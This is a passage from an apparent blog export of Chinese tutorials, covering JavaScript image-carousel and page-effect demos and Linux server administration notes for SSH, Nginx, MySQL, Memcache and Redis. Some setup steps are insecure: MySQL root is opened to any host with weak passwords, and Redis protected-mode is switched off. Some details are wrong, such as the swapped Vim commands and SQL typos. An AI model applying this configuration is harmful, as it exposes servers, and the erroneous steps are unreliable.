	    		t=0;
    		}
    		showPic(t);
    		showBtn(t);
	    	console.log(t);
    	}
    	var cl1 = setInterval(run,1000); 

    	function showPic(t){
    		for (var i = 0; i < imgs.length; i++) {
    			imgs[i].style.display="none";
    		}
    		imgs[t].style.display="block";
    	}

    	function showBtn(t){
    		for (var i = 0; i < lis.length; i++) {
    			lis[i].setAttribute('style','');
    		}
    		lis[t].setAttribute('style',"color:red;background: rgba(0,255,255,1);");
    	}

    	// 鼠标划入时,解除定时器
    	container.onmouseover = function(){
    		clearInterval(cl1);
    	}
    	container.onmouseout = function(){
    		cl1 = setInterval('run()',1000);
    	}

    	// 鼠标滑过按钮时,切换为绑定页面
    	for (var i = 0; i < lis.length; i++) {
    		(function(i){
    			lis[i].onmouseover = function(){
    				t=i;
    				showPic(t);
    				showBtn(t);
    			}

    		})(i);
    	}

    	// 按钮控制下一张上一张
    	function previous(){
    		clearInterval(cl1);
    		console.log(t);
    		t--;
    		if (t<0) {
    			t=(imgs.length-1);
    		}
    		showPic(t);
    		showBtn(t);
    		cl1 = setInterval(run,1000);
    		
    	}
    	function next(){
    		clearInterval(cl1);
    		t++;
    		if (t>(imgs.length-1)) {
    			t=0;
    		}
    		showPic(t);
    		showBtn(t);
    		cl1 = setInterval(run,1000);
    	}


    </script>

</body>
```



### 图片无缝轮滚

```
    <meta charset="UTF-8">
    <title>Document</title>
    <style type="text/css">
        #box{
            width: 800px;
            height: 220px;
            margin: 0 auto;
            margin-top: 50px;
            border: 1px solid #000;
            /*overflow: auto;*/
            overflow: hidden;
        }
        #content{width: 10000px;}
        #imglist{float: left;}
        #imglist img{
            width: 300px;
            height: 200px;
            float: left;
        }
    </style>
</head>
<body>
    <h1>图片无缝轮滚</h1>
    <hr>

    <div id="box">
        <div id="content">
            <div id="imglist">
                <img src="./imgs/mm041.jpg">
                <img src="./imgs/mm042.jpg">
                <img src="./imgs/mm043.jpg">
                <img src="./imgs/mm044.jpg">
                <img src="./imgs/mm045.jpg">
                <img src="./imgs/mm046.jpg">
                <img src="./imgs/mm047.jpg">
                <img src="./imgs/mm048.jpg">
                <img src="./imgs/mm049.jpg">
                <img src="./imgs/mm050.jpg">
                <img src="./imgs/mm051.jpg">
                <img src="./imgs/mm052.jpg">
                <img src="./imgs/mm053.jpg">
                <img src="./imgs/mm054.jpg">
                <img src="./imgs/mm055.jpg">
            </div>
        </div>
    </div>

    <script>
    var width = imglist.offsetWidth;
    // console.log(width);
    // 将图片集合 复制一份,并追加到当前图片集合之后
    content.appendChild(imglist.cloneNode(true));

    // box.scrollLeft = 500;
    function scrollImage(){
        if (box.scrollLeft >= width) {
            box.scrollLeft = 0;
        }
        box.scrollLeft += 1;
        // console.log(box.scrollLeft);
    }
    setInterval(scrollImage, 50);
    
    </script>
</body>
```

```
<head>
    <meta charset="UTF-8">
    <title>图片跑马灯儿</title>
    <style>
    	#show{
    		margin: 10px auto;
    		width: 1202px;
    		height: 302px;
    		border: 1px solid #000;
    		/*overflow: scroll;*/
    		overflow: hidden;
    	}
    	#imgList{
    		height: 300px;
    		width: 4800px;
    		white-space:nowrap;

    	}
    	img{
    		width: 400px;
    		height: 300px;
    		margin: 0;
    		padding: 0;
    		float: left;

    	}
    </style>
</head>
<body>
    <h1>图片跑马灯儿</h1>
    <hr>
    
    <div id="show">
    	
    	<div id="imgList">
    		<img src="./imgs/mm021.jpg">
    		<img src="./imgs/mm022.jpg">
    		<img src="./imgs/mm023.jpg">
    		<img src="./imgs/mm024.jpg">
    		<img src="./imgs/mm025.jpg">
    		<img src="./imgs/mm026.jpg">
    		<img src="./imgs/mm021.jpg">
    		<img src="./imgs/mm022.jpg">
    		<img src="./imgs/mm023.jpg">
    		

    </div>
	
	<script>
		
		setInterval(function(){
			show.scrollLeft++;
			if (show.scrollLeft == 2400) {
				show.scrollLeft = 0;
			}
		},1)

	</script>


</body>
```



### 下滑加载图片

```
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style type="text/css">
        #imglist{
            width: 90%;
            margin: 0 auto;
        }
        #imglist img{
            width: 600px;
            height: 400px;
            background: url(./imgs/loading.gif) no-repeat center center;
        }
    </style>
</head>
<body>
    <h1>下滑加载图片</h1>
    <hr>

    <div id="imglist">
        <img data-src="./imgs/mm041.jpg">
        <img data-src="./imgs/mm042.jpg">
        <img data-src="./imgs/mm043.jpg">
        <img data-src="./imgs/mm044.jpg">
        <img data-src="./imgs/mm045.jpg">
        <img data-src="./imgs/mm046.jpg">
        <img data-src="./imgs/mm047.jpg">
        <img data-src="./imgs/mm048.jpg">
        <img data-src="./imgs/mm049.jpg">
        <img data-src="./imgs/mm050.jpg">
        <img data-src="./imgs/mm051.jpg">
        <img data-src="./imgs/mm052.jpg">
        <img data-src="./imgs/mm052.jpg">
        <img data-src="./imgs/mm050.jpg">
        <img data-src="./imgs/mm050.jpg">
        <img data-src="./imgs/mm050.jpg">
        <img data-src="./imgs/mm053.jpg">
        <img data-src="./imgs/mm054.jpg">
        <img data-src="./imgs/mm055.jpg">
        <img data-src="./imgs/mm055.jpg">
    </div>

    <script>

        var imgs = imglist.getElementsByTagName('img');

        // 获取 imglist 的宽度
        var box_width = imglist.offsetWidth;

        // 获取 视口高度
        var view_height = document.documentElement.clientHeight;
        // console.log(view_height);
        // 计算 横着 能加载几张图片
        var x_number = Math.floor(box_width / imgs[0].offsetWidth);
        // console.log(x_number);
        
        // 首屏图片数量
        // Math.ceil((视口的高度 - 首图到顶部的偏移量) / img的高度) * x_number
        var first_number = Math.ceil((view_height - imgs[0].offsetTop) / imgs[0].offsetHeight) * x_number;
        // console.log(first_number);
        
        // loadImage(0, 4);
        // loadImage(4, 2);
        // 全局计数的变量,用于记录加载到第几张
        var m = 0;
        // 加载第一屏的图片
        loadImage(m, first_number);
        // 更新加载记录数
        m += first_number;

        /**
         * 加载图片
         * @param   start   从第几张开始加载
         * @param   length  加载几张图片
         */
        function loadImage(start, length){
            for (var i = start; i < (start+length); i++) {
                // 判断图片集合是否加载完毕
                if (i >= imgs.length) return;

                // console.log(i);
                (function (i){
                    setTimeout(function(){
                        imgs[i].src = imgs[i].getAttribute('data-src');
                    }, 500);
                })(i);
            }
        }

        // 绑定滚动事件
        window.onscroll = function (){
            // 判断图片集合是否加载完毕
            if (m >= imgs.length) return;
            // 获取 滚动条滚过的距离
            var top= document.body.scrollTop || document.documentElement.scrollTop;

            // 还未加载的首图 到顶部的偏移量
            var img_top = imgs[m].offsetTop;

            // console.log(top, img_top);
            // 判断加载下一批图片的临界点
            if ((top + view_height) >= img_top) {
                // 加载下一批图片
                loadImage(m, x_number);
                m += x_number;
            }
        }

    </script>
</body>
```



### 蛇形文字

```
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        .strstyle {
            font-size:20px;
            color: #f00;
            font-weight:700;
            position:absolute;
            top:-50px;
        }
    </style>
</head>
<body>
    <h1>蛇形文字</h1><hr>


    <script>
        //文字输出
        var msg = "JavaScript 蛇形文字...";
        for (var i = 0; i < msg.length; i++) {
            document.write('<span id="str'+i+'" class="strstyle">');
            document.write(msg[i]);
            document.write('</span>');
        }

        //绑定鼠标移动事件,得到鼠标位置
        document.onmousemove = function(e){
            e = e || window.event;
            document.title = 'X:'+e.clientX+'Y:'+e.clientY;

            //让每个字之间 有延迟的统一行动!
            var m = 0;
            var timer = setInterval(function(){
                // console.log(m);
                // 根据字数 控制次数 不能无限循环定时
                if(m < msg.length) {
                    // 调用文字运动轨迹函数
                    // x坐标,y坐标,第几个字
                    snake(e.clientX, e.clientY, m);
                    m++;
                }else{
                    //如果 次数大于等于字数,就清除定时
                    clearInterval(timer);
                }
            },50);
        }

        // 文字运动轨迹函数
        function snake(x,y,i){
            //获得每一个span元素对象
            var span = document.getElementById('str'+i);
            // console.log(span);
            span.style.left = x + (i*25) + 'px';
            span.style.top = y + 'px';
        }

    </script>
</body>
```



### 模态框(Modal)

```
<head>
    <meta charset="UTF-8">
    <title>模态框</title>
    <style>
        *{
            margin: 0;
            padding: 0;
            list-style: none;
            text-decoration: none;
        }
        a{
            font-size: 40px;
        }
        #modal {
            width: 100%;
            height: 100%;
            display: none;
            position: fixed;
            left: 0;top: 0;
            right: 0;bottom: 0;
            background: rgba(55,55,55,0.55);
        }
        #modalCeng{
            width: 400px;
            height: 200px;
            background-color: #eee;
            border: 3px solid #f00;
            display: none;
            position: fixed;
            margin: 100px 50%;
            left: -200px;
            z-index: 99;
        }
        #closeBtn{
            position:absolute;
            right:5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="#" onclick="show()">点击登录</a>
    </div>
    <div id="modalCeng">
        <button onclick="dis()" id="closeBtn">　X　</button>
        <br><br><br>
        用户名: <input type="text" name="name"><br>
        密码: <input type="password" name="pass">
        <br>
        <button>登录</button>
        <button onclick="dis()">取消</button>
    </div>
    <div id="modal"></div>

    <hr>
    <p>line 1</p>
    <p>line 2</p>
    <p>line 3</p>
    <p>line 4</p>
    <p>line 5</p>
    <p>line 6</p>
    <p>line 7</p>
    <p>line 8</p>
    <p>line 9</p>
    <p>line 10</p>
    <p>line 11</p>
    <p>line 12</p>
    <p>line 13</p>
    <p>line 14</p>
    <p>line 15</p>
    <p>line 16</p>
    <p>line 17</p>
    <p>line 18</p>
    <p>line 19</p>
    <p>line 20</p>
    <p>line 21</p>
    <p>line 22</p>
    <p>line 23</p>
    <p>line 24</p>
    <p>line 25</p>
    <p>line 26</p>
    <p>line 27</p>
    <p>line 28</p>
    <p>line 29</p>
    <p>line 30</p>
    <p>line 31</p>
    <p>line 32</p>
    <p>line 33</p>
    <p>line 34</p>
    <p>line 35</p>
    <p>line 36</p>
    <p>line 37</p>
    <p>line 38</p>
    <p>line 39</p>
    <p>line 40</p>



<script>
    var modal = document.getElementById('modal');
    var mc = document.getElementById('modalCeng');

    function show () {
        modal.style.display = 'block';
        mc.style.display = 'block';
    }

    function dis () {
        modal.style.display = 'none';
        mc.style.display = 'none';
    }
</script>
</body>
```



### 自定义输出表格(节点方式)

```
<head>
    <meta charset="UTF-8">
    <title>JS</title>
</head>
<body>
    <h1>XML DOM Table - 自定义</h1>
    <hr>
    行:<input type="text" name="num1" id="num1">
    列<input type="text" name="num1" id="num2">
    <button onclick="createTab()" id="tabshow">建立表格</button>
    <div id="tables"></div>

<script>
    function createTab () {
        //获取要生成的行列数
        var rows = document.getElementById('num1').value;
        var cols = document.getElementById('num2').value;
        //创建table 和 tr节点
        var tab = document.createElement('table');
        var tr = document.createElement('tr');

        tab.width = '800';
        tab.border = '1';
        tab.cellSpacing = '0';
        tables.appendChild(tab);//添加节点 table
        tab.appendChild(tr);//添加节点 tr

        //th 表头部分
        for (var i = 0; i < cols; i++) {
            var th = document.createElement('th');
            tr.appendChild(th);
            th.innerHTML = i;
        }

        //rows x cols 创建表格内容
        for (var i = 0; i < rows; i++) {
            tr = document.createElement('tr');
            tab.appendChild(tr);
            if (i%2 == 0 ) {
                tr.style.backgroundColor='#f90';
            }
            for (var j = 0; j < cols; j++) {
                var td = document.createElement('td');
                tr.appendChild(td);
                td.innerHTML = i +'-'+ j;
            }
        }
    }
</script>
</body>
```



]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX基础操作(PHP版)</title>
    <url>/2019/01/12/LINUX%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C(PHP%E7%89%88)/</url>
    <content><![CDATA[
## ssh - Secure Shell  

> 安全外壳协议(安全的远程连接)

### 1.服务器端配置安装:

- 安装:`yum install openssh -server`
- 启动:`service sshd start`
- 设置开机运行:`chkconfig sshd on`

> 查看启动服务: `ps -ef|grep ssh`

### 2.客户端配置:

Windows: `XShell/Putty`

Linux: `yum install openssh-clients`

### 3.ssh使用

`ssh 用户名@IP地址`(22端口)

### 4.SSH config配置

存放路径: `~/.ssh/config`

```
多用户分配
touch config
vim config
host "laowang"
	HostName 192.168.0.15
	User root
	Port 22
```

> IdentityFile ~/.ssh/id_rsa.pub
>
> IdentitiesOnly yes

效果: `ssh laowang`直接登录

### 5.SSH安全免密登录(ssh key)

> 公钥公开, 私钥保存本地~/.ssh/authorized_key
>
> 若服务器上已有该文件 , 将公钥文件内容添加至服务器文件即可

生成:

`ssh-keygen -t rsa`

`ssh-keygen -t dsa`

添加配置私钥至ssh服务(本地linux端)

`ssh-add ~/.ssh/naxx_rsa`

### 6.SSH端口安全

修改服务端口

> 文件路径/etc/ssh/sshd_config

1.`vim /etc/ssh/sshd_config`

2.修改port 

<hr>

## Linux常用命令:

### 1.软件操作命令

​	软件包-`yum`

​	安装: `yum install xxx`

​	卸载:`yum remove xxx`

​	搜索:`yum search xxx`

​	清理缓存:`yum clean packages`

​	已安装列表:`yum list`

​	软件包信息:`yum info xxx`

### 2.服务器资源命令

​	内存大小:`free -m`

​	磁盘大小:`df -h`

​	分区信息:`fdisk -lu`

​	负载:`w/top`  (一般0.6~0.7)

​	cpu个数和核数:`cat /proc/cpuinfo`

### 3.文件/文件夹操作

#### 1).文件目录结构

```
- 根目录`/`
- 家目录`/home`
- 临时目录`/tmp`
- 配置目录`/etc`
- 用户程序目录`/usr`
```

![1567947579354](/images/imgs/1567947579354.png)



#### 2).基本操作命令

​		- 查看目录下文件:`ls -al`

​		- 新建文件:`touch`

​		- 新建文件夹:`mkdir`     -p

​		- 进入目录:`cd`

​		- 删除文件/目录:`rm`

​		- 复制:`cp`

​		- 移动/剪切:`mv`

​		- 显示路径:`pwd`

#### 3).文本编辑Vim

```
	- 插入模式编辑`i`
	- 首行`G`
	- 尾行`gg`
	- 删除一行`dd`
	- 回复`u`
	- 复制一行`yy`
	- 粘贴`p`
	- 退出`:q`
	- 保存`:w`
```

#### 4).文件权限421

| r       | w        | x            |
| ------- | -------- | ------------ |
| 读-read | 写-write | 执行-execute |
| 4       | 2        | 1            |

​		更改权限`chmod -R 777 runtime/`

> 更改文件所有者 : `sudo chown -R naxx:naxx /data/test.txt`

#### 5).搜索/查找/读取

```
	- 从文件尾部开始读:`tail`		`tail -f xxx`
	- 从文件头部开始读:`head`
	- 读取整个文件:`cat`
	- 分页读取:`more`
	- 可控分页:`less`
	- 搜索关键字:`grep`			`grep -n "123" xxx.php`
	- 查找文件:`find` 				`find /etc/ -name "naxx"`
	- 统计个数:`wc`  					`cat index.php | wc -l`
```

#### 6).文件压缩/解压

​		**tar**

```
	- 压缩:`tar -cf naxx.tar 文件名`      `.gz格式压缩:tar -czvf naxx.tar.gz 文件名 `
	- 解压缩:`tar -xf naxx.tar`       `.gz解压:tar -xzvf naxx.tar.gz`
	- 查看:`tar -tvf naxx.tar`         `.gz查看:tar -tzvf naxx.tar.gz`
```

### 4.系统用户操作

​	1.添加用户 `useradd 用户名`

​	2.添加用户`adduser 用户名`

```
> 区别:(Ubuntu)
>
> 在root权限下，useradd只是创建了一个用户名，如 （useradd  +用户名 ），它并没有在/home目录下创建同名文件夹，也没有创建密码，因此利用这个用户登录系统，是登录不了的，为了避免这样的情况出现，可以用 （useradd -m +用户名）的方式创建，它会在/home目录下创建同名文件夹，然后利用（ passwd + 用户名）为指定的用户名设置密码。
>
> 可以直接利用adduser创建新用户（adduser +用户名）这样在/home目录下会自动创建同名文件夹
```

​	3.删除用户`userdel -r 用户名` (同时删除用户文件夹)

​	4.设置密码`passwd 用户名`

### 5.防火墙设置

```
> 保护服务器安全/设置规则/关闭防火墙
>
> 一般配置: (开放指定端口)
```

​	1.安装

​	`yum install firewalld`

​	2.启动

​	`service firewalld start`

​	3.检查状态

​	`service firewalld status`

​	4.关闭/禁用防火墙

​	`service firewalld stop/disable`

​	5.查看安装状态

​	`yum list | grep firewall`

​	6.查看服务状态

​	`ps -ef | grep firewall`

> firewall-cmd 操作

### 6.提权及文件传输

#### 1.提权: `sudo` 

​	`visudo `

```
- root账号登录: ssh root@192.168.1.xxx
- 打开权限文件: visudo
- 输入`/all`搜索后添加内容
	## Allows people in group wheel to run all commands
	# %wheel        ALL=(ALL)       ALL
	%naxx        ALL=(ALL)       ALL
- :wq保存退出,提权完成
```

#### 2.文件下载

​	`wget / curl ` 

```
wget https://www.baidu.com/     -存为index.html
curl -o baidu.html https://www.baidu.com/     -存为百度.html
```

#### 3.文件上传

​	linux系统:`scp ` 

```
- 以naxx账号的权限上传到/tmp目录:`scp test.txt naxx@192.168.1.xxx:/tmp/`
- 以naxx账号权限下载指定文件到本地:`scp naxx@192.168.1.xxx:/tmp/test.txt ./`
```

​	Windows:`lrzsz`

```
- 服务器安装`sudo yum install lrzsz`
- 上传文件 `rz`  (弹窗选择上传文件)
- 下载文件 `sz test.txt`  (弹窗选择本地保存路径)
```

## Apache

### 1.基本操作

安装: `yum install httpd`

启动: `service httpd start`

停止: `service httpd stop`

查看: `ps -ef | grep http`

端口: `sudo netstat -anpl | grep http`

### 2.文件目录

#### 1.配置虚拟主机

```
- /etc/httpd
- config文件中配置虚拟主机
- 搜索/virtual
	#virtual host being defined.
	<VirtualHost *:80>
		ServerName www.naxx.test
		DocumentRoot /data/www
		<Directory "/data/www/">
			Options Indexes FollowSymlinks
			AllowOverride None
			Require all granted
		</Directory>
	</VirtualHost>
- 重启服务 service httpd restart
```

```
修改host `vim /etc/host`
192.168.1.xxx www.naxx.test
```

> setenforce :  0-关闭selinux防火墙   1- 开启

#### 2.伪静态:

​	`mod_rewrite.so`

​	conf文件中添加: `LoadModule rewrite_module modules/mod_rewrite.so`

## Nginx

### 1.基本操作

- 安装  `yum install -y nginx`

  > 先添加资源库:
  >
  > `sudo rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm`

- 启动  `service nginx start`

- 停止  `service nginx stop`

- 重载  `service nginx reload`  (无缝重启动)

  > 安装完毕后/etc/nginx

### 2.扩展

#### 1.虚拟主机

> 配置文件目录: /etc/nginx/conf.d/*.conf  (具体查看nginx.conf)
>
> cp default.conf.

```
server{
	listen 		 80;
	server_name  www.naxx.test;
	root   /usr/share/nginx/html;
	index  index.html index.htm;
}
```

> Apache和Nginx不能同时运行, 默认端口都是80端口

#### 2.多域名、多端口

```
server{
	listen 		80;
	listen      9988;
	server_name www.naxx.test www.naxxx.test;
	root  /data/www;
	index index.html index.htm;
}
```

#### 3.伪静态

```
server{
	listen 		80;
	server_name www.naxx.test;
	root  /data/www;
	index index.html index.htm;
	location / {
		rewrite ^(.*)\.htmp$ /index.html;
	}
}	
```

#### 4.日志格式化

> 格式设置在 nginx.conf文件中
>
> 默认日志文件目录 : /var/log/nginx/access.log
>
> 单虚拟主机配置单日志: access_naxx_log  /var/log/nginx/access.log  格式名;

```
http{
	log_format main 'xxx';
	log_format 添加新格式名 '格式参数';
	
	access_log /var/log/nginx/access.log 格式名;
}
```

#### 5.反向代理/负载均衡

1.原理

反向代理: 用户->Nginx服务器->真实资源服务器

负载均衡: 多服务器承载相同的请求

![1568001116845](/images/imgs/1568001116845.png)

2.配置

```
文件路径: conf.d/naxx.conf
upstream naxx_hosts{
	server xxx.xxx.xxx.xx1:80 weight=5; #(权重配置)
	server xxx.xxx.xxx.xx2:80 weight=1;
}
server{
	listen 		80;
	server_name www.naxx.test;
	root  /data/www;
	index index.html index.htm;
	location / {
		proxy_set_header Host www.ni9ne.net;
		proxy_pass http://naxx_hosts;
		
	}
}	
```

#### 6.调试技巧

单行调试功能

```
add_header Content-Type "text/plain;charset=utf-8";
return 200 "$http_host";
```

## MySQL

### 1.基本操作

​	安装: `yum install mysql-community-server`

​	启动: `service mysqld start/restart`

​	停止: `service mysql stop`

### 2.MySQL安装

```
-CentOS7默认安装mariadb数据库,先移除
	yum remove mariadb-libs.x86_64
-下载Mysql源
	https://dev.mysql.com/downloads/repo/yum/
-安装源
	yum localinstall mysql57-community-release-el7-8.noarch.rpm
-安装mysql服务
	yum install mysql-community-server
-默认密码
	cat /var/log/mysqld.log | grep "password"
-修改密码
	SET PASSWORD = PASSWORD('123123123');
```

> 下载 : `wget https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm`

### 3.扩展知识

#### 1.远程连接

```
开启远程连接功能
mysql -h127.0.0.1 -uroot -p
xxxxxx
show databases; --查看数据库
use mysql;
show tables;  --查看表
select * from user \G;  --格式化显示表内容
updata user set host = '%' where Host = "localhost" and User = "root";  --修改权限
flush privileges; --刷新权限
--配置防火墙开启3306端口
```

#### 2.开启Genelog

> 记录所有的数据库操作日志文件

```
mysql> set global general_log_file="/tmp/geberal.log"; --设置保存位置
mysql> set global general_log=on; --打开配置
```

#### 3.新建用户和权限操作

**创建用户**

```
mysql> create user 'naxx'@'%' identified by '123123123';
```

> 密码策略改变(简单密码可用):
>
> mysql> set global validate_password_policy=0;
>
> mysql> set global validate_password_length=1;

**赋予权限**

```
mysql> grant all privileges on *.* to 'naxx'@'%' identified by '123123123' with grand option;
mysql> flush privileges;
```

> all privileges 代表所有权限, 可以使用'insert,select,update,delete'代替

**回收权限**

```
mysql> revoke all privileges on *.* from naxx;
mysql> flush privileges;
```

#### 4.忘记root密码

**跳过密码验证**

```
- vim /etc/my.cnf
	添加: skip-grant-tables
- service mysqld restart
- mysql> use mysql;
- mysql> update user set authentication_string = password('123123') where user = "root";
- mysql> flush privileges;
- 删除之前配置文件中添加的skip-grant-tables,登录
```

### 4.MySQL客户端工具

SQLyog / Navicat / HeidiSQL / S-equal Pro / phpMyadmin

## 缓存服务

### 1.memcached

#### 1.基本操作

- 安装: `yum install memcached`

- 启动: `memcached -d -l -m -p`

  > d:作为守护进程来运行
  >
  > m:分配给Memcached的内存
  >
  > l: Memcached监听的IP地址
  >
  > p:Memcached监听的端口
  >
  > u: 运行Memcached的用户
  >
  > memcached -d -m 10 -u root -l 192. 168. 1. 130 -p 11211

- 停止: `kill pid`

```
telnet简介
作用 - 判断端口是不是通畅 / 发送命令
安装 - yum install telnet.*
使用 - telnet 127.0.0.1 80
```

#### 2.常用命令

设置: `set naxx 0 60 5`

获取: `get naxx`

删除: `delete naxx`

退出: `quit`

### 2.redis

#### 1.基本操作

- 安装: `源码编译安装` 

  > `wget 下载网址`
  >
  > `tar -xzvf redis.tar.gz`
  >
  > `make`  (若gcc不存在, `yum install gcc`)
  >
  > `make MALLOC=libc`
  >
  > `make install`

  | 命令             | 简介                  |
  | ---------------- | --------------------- |
  | redis-server     | Redis服务器端启动程序 |
  | redis-cli        | Redis客户端操作工具   |
  | redis-benchmark  | Redis性能测试工具     |
  | redis-check-aof  | 数据修复工具          |
  | redis-check-dump | 检查导出工具          |

  **默认端口: 6379 ** 

- 启动: `redis-server start/restart` 

- 停止: `redis-server stop `

- 客户端: `redis-client `

#### 2.扩展知识

- redis支持多种类型的数据结构: list set hash string
- 支持数据备份, mster-slave模式的数据备份
- 数据持久化, 可以将内存中的数据保存在磁盘中, 重启的时候重载

#### 3.命令

设置: `set naxx hello`

获取: `get naxx`

删除: `del naxx`

> 需要使用telnet链接 , 在服务器端redis-cli界面输入: `CONFIG SET protected-mode no`, 即可
>
> `telnet 102.168.1.xxx 6379`

还支持**list** ,**hash** ,**set** 等多种格式数据]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>SSH</tag>
        <tag>Linux</tag>
        <tag>Apache</tag>
        <tag>Nginx</tag>
        <tag>Memcache</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Memcache存放SESSION</title>
    <url>/2018/09/07/Memcache%E5%AD%98%E6%94%BESESSION/</url>
    <content><![CDATA[
# Memcached

> 什么是Memcached?

- 免费并且开源，高性能的分布式内存对象缓存系统，通过减轻数据库负载来加速动态web应用程序的使用。
- 一种内存中的键值存储，用于从数据库调用、API调用或页面呈现的结果中获得少量任意数据(字符串、对象)
- PHP 的扩展(服务名)

> 优点

- 简单而强大
- 促进了快速部署，简化了开发
- 解决大型数据缓存面临的许多问题
- 它的API适用于大多数流行语言
- 支持 binary protocol 协议
- 支持对同一key的多进程的并发处理问题



> 安装

```
1. 安装phpize
	apt-get install php7.0-dev
2. 安装memcached&依赖
	apt-get install memcached
	apt-get install libmemcached11 libmemcached-dev libmemcachedutil2
3. 安装memcached拓展
	1. apt-cache search -n php7.0  # 查看 php7.-0 的软件包
	2. git clone https://github.com/php-memcached-dev/php-memcached.git	# 下载 memcached 到本地仓库，并切换到 php7 版本
	3. cd php-memcached/	# 进入memcached目录
	4. git checkout php7	# 切换分支
	5. phpize
	6. ./configure --disable-memcached-sasl 
	7. apt-get install pkg-config (如果第六步有报错执行该步骤在执行第六步,如果没有则直接跳过)
	8. make && make install	# 编译安装(编译安装完成后会返回 buil completed 提示信息以及你的扩展地址,记住该路径)
	9. vi /etc/php/7.0/fpm/conf.d/memcached.ini	#把扩展添加进php中
	10. extension=/usr/lib/php/20151012/memcached.so	#完成第9步之后写入该步骤的内容
	11. vi /etc/php/7.0/apache2/php.ini	# 把扩展添加进php中
	12. extension=/usr/lib/php/20151012/memcached.so	#完成第11步之后写入该步骤的内容(写入到差不多866行左右的位置)
	13. 重启Apache2 
	14. 访问phpinfo看是否有memcached拓展
```



# Memcache

> 什么是Memcache?

- 免费并且开源，高性能的分布式内存对象缓存系统，通过减轻数据库负载来加速动态web应用程序的使用。
- 一种内存中的键值存储，用于从数据库调用、API调用或页面呈现的结果中获得少量任意数据(字符串、对象)
- PHP 的扩展(服务名)

> 优点

- 简单而强大
- 促进了快速部署，简化了开发
- 解决大型数据缓存面临的许多问题
- 它的API适用于大多数流行语言
- 支持对同一key的多进程的并发处理问题



> 安装

```
1. 安装phpize(如果已经安可直接跳过)
	apt-get install php7.0-dev
2. 安装memcache
	1. git clone https://github.com/websupport-sk/pecl-memcache memcache	# # 下载 memcached 到本地
	2. cd memcache	# 进入memcache目录
	3. phpize
	4. whereis php-config    # 查找php-config目录
		php-config: /usr/bin/php-config /usr/share/man/man1/php-config.1.gz
		
	5. ./configure --enable-memcache --with-php-config=/usr/bin/php-config --with-zlib-dir	# 编译
	6. make && make install		# 编译安装(编译安装完成后会返回 buil completed 提示信息以及你的扩展地址,记住该路径)
	7. vi /etc/php/7.0/apache2/php.ini	# 把扩展添加进php中
	8. extension=/usr/lib/php/20151012/memcached.so	#完成第7步之后写入该步骤的内容(写入到差不多866行左右的位置)
	9. 重启Apache2 
	10. 访问phpinfo看是否有memcached拓展
```





# Memcache存放SESSION

> 1. 修改php.ini配置文件

```
1. vi /etc/php/7.0/apache2/php.ini	# 打开php.ini配置文件
2. 找到session.save_handler，并设为 session.save_handler = memcache，把session.save_path前面的分号去掉，并设置为 session.save_path = “tcp://127.0.0.1:11211″
3. 重启服务sudo service apache2 restart
```



> 2. .htaccess

```
php_value session.save_handler “memcache”
php_value session.save_path “tcp://127.0.0.1:11211″
```



> 3. 临时生效

```
ini_set(“session.save_handler”, “memcache”);
ini_set(“session.save_path”, “tcp://127.0.0.1:11211″);
```

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Memcache</tag>
      </tags>
  </entry>
  <entry>
    <title>Memcache</title>
    <url>/2018/09/05/Memcache/</url>
    <content><![CDATA[
### 1.背景:

随着计算机性能的发展 , 内存空间的加大 , 原本被存储在硬盘中的数据库数据可以被存入读取速度更快的内存当中

管理服务器数据存入内存的软件--->memcache

### 2.流程

安装--->启动(memcached)--->链接(port:11211)---->发送命令(get/set)

存储格式:hash键值对

key(键)		value(值)		length		time(存活时间)

注: memcache重启,内存中数据也就消失.

​	使用内存较多 , CPU使用少 , 与Apache相反 

使用:缓存sql语句 , 会话控制机制

### 3.安装

Windows 32x 64x

Linux

### 4.启动

Windows:

常用参数:

 `-p<num>` 	设置链接端口号(默认不设置为11211)

`-U<num>`		UDP监听端口(默认11211,0时关闭)

`-l<ip_address>` 	绑定地址(默认无论内外网或本地ip都允许,有安全隐患,若设置为127.0.0.1就只能本机访问)

`-d` 	独立进程运行

- `-d start` 	启动memcached服务
- `-d restart`    重启memcached服务
- `-d stop|shutdown`    关闭正在运行的memcached服务
- `-d install`    安装memcached服务
- `-d uninstall`    卸载memcached服务

`-u <username>`     绑定使用指定用户运行进程

`-m <num>`    允许最大内存使用量 , 单位M (默认为64M)

`-P <file>`    将PID写入文件`<file>`,配合 `-d` 一起使用

`-M`     内存耗尽时返回错误 , 而不是删除项

`-c`     最大同时连接数 , 默认是1024

`-f`    块大小增长因子 , 默认是1.25

`-n`    最小分配空间 , key+value+flags默认是48

`-h`    显示帮助

```
#/usr/local/memcached/bin/memcached -d -m 256 -p 11211 -u www -l 127.0.0.1
#/usr/local/memcached/bin/memcached -d -m 1024 -p 11211 -u root -c 1000
```

### 5.基础常用命令(客户端)

--`stats` : 当前所有memcached服务器运行的状态信息

--`add` : 添加一个数据到服务器

--`set` : 替换一个已经存在的数据 , 如果数据不存在 , 则和add命令相同

--`get` : 从服务器端提取指定的数据

--`delete` : 删除指定的单个数据 , 如果要清除所有的数据 , 请使用`flush_all`指令

- 客户端链接直接操作memcached

  `telnet localhost 11211`

- 添加数据

  `add 键名(key) 标志(flag) 存活时间(time) 长度(length) `

  `输出数据(长度与设定长度相同)`

  eg: `add name x1 30 5       回车换行        tomey`

  注 : 时间设为0永久存在

- 删除所有数据

  `flush_all`

- `stats`     得到memcached 的运行状态

- `stats items`    显示各 item 的数目和最老 item 的年龄

- `stats cachedump 2(item后数字) n(0-得到全部)` 展示某个slab中的前n个key列表

### 6.PHP操作

 	memcache 函数库(基于php开发)(面向对象和面向过程)

​	`memcache_add()  或者   memcache_obj->add()`

​	memcached 函数库(基于c++开发)(只有面向对象使用)

> 安装memcache 和memcached扩展: ....

```
	<?php
		// 创建一个memcache对象
		$mem = new Memcache;
		
		// 链接memcache服务器
